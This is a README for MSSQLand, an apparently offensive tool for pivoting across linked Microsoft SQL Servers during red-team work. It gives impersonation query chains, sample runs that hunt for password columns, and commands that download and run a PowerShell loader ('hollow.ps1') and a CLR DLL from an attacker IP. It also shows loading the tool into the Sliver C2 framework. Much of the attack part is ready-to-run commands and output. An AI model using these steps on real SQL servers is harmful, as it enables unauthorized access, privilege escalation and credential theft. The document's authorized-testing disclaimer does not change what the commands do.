# MSSQLand ✈️
Land gracefully in your target MSSQL DBMS, as if arriving on a business-class flight with a champagne glass in hand. 🥂

<p align="center">
    <img width="350" src="/media/MSSQLand__icon.webp" alt="MSSQLand Logo">
</p>

MSSQLand is your ultimate tool for interacting with [Microsoft SQL Server (MSSQL)](https://en.wikipedia.org/wiki/Microsoft_SQL_Server) database management system (DBMS) in your red activities. It allows you to pave your way across multiple linked servers and impersonate anyone (authorised) on the road, popping out of the last hop with any desired action.

The tool's precise and structured output is surrounded by timestamps and enriched with useful information, making it perfect for capturing beautiful screenshots in your reports.

For example, running this command:
```shell
MSSQLand.exe /t:SQL01:Moulinier /u:Jacquard /p:Fr@nce!1940%Tr1c /c:local /l:SQL02:webapp03,SQL03:webapp04,SQL04:Jacquard /a:tables balard
```

Create the following output:
```txt
====================================
  Start at 2025-01-15 21:53:53 UTC
====================================
[>] Trying to connect with LocalCredentials
[+] Connection opened successfully
|-> Workstation ID: SQL01
|-> Server Version: 15.00.2000
|-> Database: master
|-> Client Connection ID: 09dfa162-725c-4aaa-9881-f788ed282db4
[i] You can impersonate anyone as a sysadmin
[+] Successfully impersonated user: Moulinier
[i] Logged in as Moulinier
|-> Mapped to the user guest
[>] Executing action: Search
|-> Searching for 'pass' in database 'agents'

[+] Found 'pass' in column headers:

| FQTN                   | Header | Ordinal Position |
| ---------------------- | ------ | ---------------- |
| [agents].[dbo].[users] | pass   | 3                |

[+] Found 'pass' in [music].[dbo].[users] rows:

| id | name  | pass               |
| -- | ----- | ------------------ |
| 51 | Calot | password04/06/1958 |

[+] Search completed.
====================================
  End at 2025-01-15 21:53:53 UTC
  Total duration: 0.11 seconds
====================================
```

And yes, all the output tables are Markdown-friendly and can be directly copied and pasted into your notes. Below is an example of `/a:tables` output:

| SchemaName | TableName | TableType  | Rows | Permissions                                                                                           |
| ---------- | --------- | ---------- | ---- | ----------------------------------------------------------------------------------------------------- |
| dbo        | secrets   | USER_TABLE | 42   | SELECT, VIEW DEFINITION                                                                               |
| dbo        | drinks    | USER_TABLE | 51   | ALTER, CONTROL, EXECUTE, INSERT, RECEIVE, REFERENCES, SELECT, TAKE OWNERSHIP, UPDATE, VIEW DEFINITION |

## Show Time 👑
The power of this tool is showable in a common use case that you can find in challenges, labs en enterprise-wide environments during your engagments. You gain access to a database `SQL01` mapped to the user `dbo`. You need to impersonate `webapp02` in order to connect to linked database `SQL02`. In `SQL02`, you need to impersonate `webapp03` in order to go further and so on and so forth.

Let's say you’ve landed an agent inside a `sqlservr.exe` process running under the high-privileged `NT AUTHORITY\SYSTEM`. Lucky you! 🎯

After some reconnaissance, you suspect this is a multi-hop linked server chain. Typing out all those **RPC** or **OPENQUERY** calls manually? 

This is what it looks like to verify if you are `sysadmin` in `SQL03` when you have to impersonate `webapp03` on `SQL02` and `webapp04` on `SQL03`:

- [OPENQUERY](https://learn.microsoft.com/fr-fr/sql/t-sql/functions/openquery-transact-sql) (If `sys.servers.is_data_access_enabled`):

```sql
SELECT * FROM OPENQUERY("SQL02", 'EXECUTE AS LOGIN = ''webapp03''; SELECT * FROM OPENQUERY("SQL03", ''EXECUTE AS LOGIN = ''''webapp04''''; SELECT IS_SRVROLEMEMBER(''''sysadmin''''); REVERT;'') REVERT;')
```

- [RPC Out](https://learn.microsoft.com/fr-fr/sql/t-sql/functions/openquery-transact-sql) (If `sys.servers.is_rpc_out_enabled`):

```shell
EXEC ('EXECUTE AS LOGIN = ''webapp03''; EXEC (''EXECUTE AS LOGIN = ''''webapp04''''; SELECT IS_SRVROLEMEMBER(''''sysadmin''''); REVERT;'') AT SQL03; REVERT;') AT SQL02
```

No thanks 🚫. Let MSSQLand handle the heavy lifting so you can focus on the big picture. You've already impersonated multiple users on each hop, and now you want to enumerate links on `SQL04`:

```shell
MSSQLand.exe /t:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04 /a:links
```

The output is as follows:
```txt
====================================
  Start at 2025-01-14 21:31:39 UTC
====================================
[>] Trying to connect with TokenCredentials
[+] Connection opened successfully
|-> Workstation ID: SQL01
|-> Server Version: 15.00.2000
|-> Database: master
|-> Client Connection ID: 1e8fd867-77b7-4330-8d0d-deff353e5dcc
[i] Logged in as NT AUTHORITY\SYSTEM
|-> Mapped to the user dbo
[i] You can impersonate anyone as a sysadmin
[+] Successfully impersonated user: webapp01
[i] Logged in as webapp01
|-> Mapped to the user dbo
[i] Execution chain: localhost -> SQL02 -> SQL03 -> SQL04
[i] Logged in as webapp05
|-> Mapped to the user dbo
[>] Executing action: Links
|-> Retrieving Linked SQL Servers

| Last Modified        | Link  | Product    | Provider | Data Source | Local Login | Remote Login | RPC Out | OPENQUERY | Collation |
| -------------------- | ----- | ---------- | -------- | ----------- | ----------- | ------------ | ------- | --------- | --------- |
| 7/7/2020 1:02:17 PM  | SQL05 | SQL Server | SQLNCLI  | SQL05       | webapp05    | webapps      | True    | True      | False     |

====================================
  End at 2025-01-14 21:31:39 UTC
  Total duration: 0.08 seconds
====================================
```

Now you want to verify who you can impersonate at the end of the chain:
```shell
MSSQLand.exe /t:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04 /a:impersonate
```
The output shows:

```txt
====================================
  Start at 2025-01-14 21:35:22 UTC
====================================
[>] Trying to connect with TokenCredentials
[+] Connection opened successfully
|-> Workstation ID: SQL01
|-> Server Version: 15.00.2000
|-> Database: master
|-> Client Connection ID: a6a69aa9-b8cc-4c93-9bc4-c162dc67806f
[>] Attempting to impersonate user: webapp02
[i] You can impersonate anyone as a sysadmin
[+] Successfully impersonated user: webapp02
[i] Server chain: SQL11 -> SQL27 -> SQL53
[i] Logged in as webapps
|-> Mapped to the user guest
[>] Executing action: Impersonation
|-> Starting impersonation check for all logins
|-> Checking impersonation permissions individually

| Logins      | Impersonation |
| ----------- | ------------- |
| sa          | No            |
| Jacquard    | Yes           |
| Calot       | No            |
| Moulinier   | No            |

====================================
  End at 2025-01-14 21:35:22  UTC
  Total duration: 0.10 seconds
====================================
```

Great! Now you can directly reach out to your loader with:
```shell
MSSQLand.exe /t:localhost:webapp02 /c:token /l:SQL02:webapp03,SQL03:webapp04,SQL04:Jacquard /a:pwshdl "172.16.118.218/d/g/hollow.ps1"
```

Or even use Common Language Runtime (CLR) to load remotely a library with `/a:clr \"http://172.16.118.218/d/SqlLibrary.dll\"`.

## Options and Features ⚙️

### Too Much Output?
Use the `/silent` switch for a streamlined experience. It minimizes output, showing only the action results, making it particularly useful for some engagements where less is more.

## Project Structure 📚
This project follows several key software development principles and practices.

1. **Single Responsability Principle (SRP)**

Each class should have one, and only one, reason to change. Each action class in the [`Actions`](./MSSQLand/Actions) directory, like [`Tables`](./MSSQLand/Actions/Database/Tables.cs), [`Permissions`](./MSSQLand/Actions/Database/Permissions.cs), or [`Smb`](./MSSQLand/Actions/Network/Smb.cs), is responsible for a single operation.
The [`Logger`](./MSSQLand/Utilities/Logger.cs) class solely handles logging, decoupling it from other logic.

3. **Open/Close Principle (OCP)**

Software entities should be open for extension but closed for modification. Here, the [`BaseAction`](./MSSQLand/Actions/BaseAction.cs) abstract class defines a common interface-like for all actions. New actions can be added by inheriting from it without modifying existing code. Then, the [`ActionFactory`](./MSSQLand/Actions/ActionFactory.cs) enables seamless addition of new actions by simply adding them to the switch case.

4. **Liskov Substitution Principle (LSP)**

Subtypes should be substitutable for their base types without altering program behavior. Here, the [`BaseAction`](./MSSQLand/Actions/BaseAction.cs) class ensures all derived actions (e.g., Tables, Permissions, Smb) can be used interchangeably, provided they implement `ValidateArguments` and `Execute`.

5. **DRY (Don't Repeat Yourself)**

Avoid duplicating logic across the codebase. The [`QueryService`](./MSSQLand/Services/QueryService.cs) centralizes query execution, avoiding repetition in individual actions.

6. **KISS (Keep It Simple, Stupid)**

Systems should be as simple as possible but no simpler. Complex linked server queries and impersonation are abstracted into services, simplifying their usage.

8. **Extensibility**

The system should be easy to extend with new features. New actions can be added without altering core functionality by extending [`BaseAction`](./MSSQLand/Actions/BaseAction.cs).

#### Directories

- [`Models`](./MSSQLand/Models)

Contains classes representing SQL Server entities, such as Server and LinkedServers.

- [`Services`](./MSSQLand/Services)

The backbone of the application, responsible for connection management, query execution, user management, and configuration handling.

- [`Actions`](./MSSQLand/Actions)

This directory contains all the specific operations that MSSQLand can perform. Each action follows a modular design using the command pattern to encapsulate its logic, such as PowerShell execution, querying, impersonation, and more.

- [`Utilities`](./MSSQLand/Utilities)

Helper classes like Logger and MarkdownFormatter that make your life easier.

## Miscellaneous 

### `sliver`
Prebuilt `alias.json` file for Sliver. In your `sliver` console:
```shell
alias load /home/n3rada/git/public/MSSQLand/Release/alias.json
```

## Contributing 🫂

Contributions to MSSQLand are welcome and appreciated! Whether it's fixing bugs, adding new features, improving the documentation, or sharing feedback, your effort is valued and makes a difference.
Open-source thrives on collaboration and recognition. Contributions, large or small, help improve the tool and its community. Your time and effort are truly valued. 

Here, no one will be erased from Git history. No fear to have here—no one will copy-paste your code without adhering to the collaborative ethos of open-source.

Please see the [CONTRIBUTING.md](./CONTRIBUTING.md) for detailed guidelines on how to get started.

## Disclaimer ⚠️
This tool is designed for educational purposes only and is intended to assist security professionals in understanding and testing the security of SQL Server environments in authorized engagements. It is specifically crafted to be used in controlled environments, such as:
- Penetration testing labs (e.g., HackTheBox, TryHackMe, OffSec exam scenarios).
- Personal lab setups designed for ethical hacking and security research.

## Important Note
Any unauthorized use of this tool in real-world environments or against systems without explicit permission from the system owner is strictly prohibited and may violate legal and ethical standards. The creators and contributors of this tool are not responsible for any misuse or damage caused.

Use responsibly and ethically. Always respect the law and obtain proper authorization.
